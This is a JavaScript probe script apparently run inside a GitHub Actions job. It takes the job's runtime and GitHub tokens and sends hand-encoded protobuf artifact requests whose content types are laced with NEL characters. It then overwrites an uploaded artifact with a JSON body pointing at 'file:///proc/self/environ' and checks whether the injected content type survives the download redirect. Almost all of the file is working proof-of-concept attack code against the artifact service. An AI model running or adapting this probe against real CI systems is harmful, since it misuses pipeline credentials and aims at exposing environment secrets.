import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';
const runtimeToken=process.env.ACTIONS_RUNTIME_TOKEN,ghToken=process.env.GH_TOKEN;
if(!runtimeToken||!ghToken)throw new Error('runtime credentials unavailable');
const claims=JSON.parse(Buffer.from(runtimeToken.split('.')[1],'base64url').toString('utf8'));
const scope=claims.scp.split(' ').find(x=>x.startsWith('Actions.Results:'));
const [,runId,jobId]=scope.split(':');
const ids=getBackendIdsFromToken(), client=internalArtifactTwirpClient();
const repo=process.env.GITHUB_REPOSITORY;
const endpoint=`${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
const placeholder=Buffer.from('{"probe":"placeholder"}');
const digest=createHash('sha256').update(placeholder).digest('hex');
function varint(value){let n=BigInt(value),a=[];while(n>=128n){a.push(Number((n&127n)|128n));n>>=7n;}a.push(Number(n));return Buffer.from(a);}
function bytesField(n,value){const b=Buffer.from(value,'utf8');return Buffer.concat([varint(BigInt(n*8+2)),varint(BigInt(b.length)),b]);}
function wrapString(value){return bytesField(1,value);}
function requestBytes(name,mime){const nested=wrapString(mime);return Buffer.concat([bytesField(1,runId),bytesField(2,jobId),bytesField(3,name),Buffer.from([0x28,0x07]),bytesField(6,nested)]);}
function readVarint(data,pos){let value=0n,shift=0n,p=pos;for(let i=0;i<10;i++){const b=data[p++];if(b===undefined)throw new Error('truncated protobuf');value|=BigInt(b&127)<<shift;if(!(b&128))return[value,p];shift+=7n;}throw new Error('varint too long');}
function decode(data){let p=0,ok=false,url='';while(p<data.length){let tag;[tag,p]=readVarint(data,p);const field=Number(tag>>3n),wire=Number(tag&7n);if(wire===0){let v;[v,p]=readVarint(data,p);if(field===1)ok=v!==0n;}else if(wire===2){let len;[len,p]=readVarint(data,p);const end=p+Number(len);if(end>data.length)throw new Error('truncated field');if(field===2)url=data.subarray(p,end).toString('utf8');p=end;}else throw new Error(`unexpected wire ${wire}`);}return{ok,url};}
async function probe(label,mime){const name=`proto-mime-${process.env.GITHUB_RUN_ID}-${label}`;const response=await fetch(endpoint+'CreateArtifact',{method:'POST',headers:{authorization:`Bearer ${runtimeToken}`,'content-type':'application/protobuf'},body:requestBytes(name,mime)});const bytes=Buffer.from(await response.arrayBuffer());let created={ok:false,url:''};if(response.ok){try{created=decode(bytes)}catch(e){return{label,status:response.status,error:`decode ${e.message}`}}}else return{label,status:response.status,error:bytes.toString('utf8').slice(0,180)};if(!created.ok||!created.url)return{label,status:response.status,error:'CreateArtifact not ok'};
const blob=new BlobClient(created.url).getBlockBlobClient();await blob.uploadData(placeholder,{blobHTTPHeaders:{blobContentType:'application/json'}});const finalized=await client.FinalizeArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${digest}`})});if(!finalized.ok)return{label,status:response.status,error:'finalize failed'};const id=String(finalized.artifactId);const body=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}}));await blob.uploadData(body,{blobHTTPHeaders:{blobContentType:'application/json'}});const rest=await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,{redirect:'manual',headers:{authorization:`Bearer ${ghToken}`,accept:'application/vnd.github+json','user-agent':'repo-cassette-own-proto-probe'}});const location=rest.headers.get('location');if(!location)return{label,id,status:rest.status,error:'no redirect'};const parsed=new URL(location),raw=await fetch(location),rawBody=Buffer.from(await raw.arrayBuffer());return{label,id,status:rest.status,rsct:parsed.searchParams.get('rsct'),rawType:raw.headers.get('content-type'),exact:rawBody.equals(body)};}
for(const [label,mime] of [['nel-prefix','\u0085application/json'],['nel-suffix','application/json\u0085'],['safe','application/json']]){try{console.log(JSON.stringify(await probe(label,mime)))}catch(e){console.log(JSON.stringify({label,error:String(e?.message||e).slice(0,200)}))}}
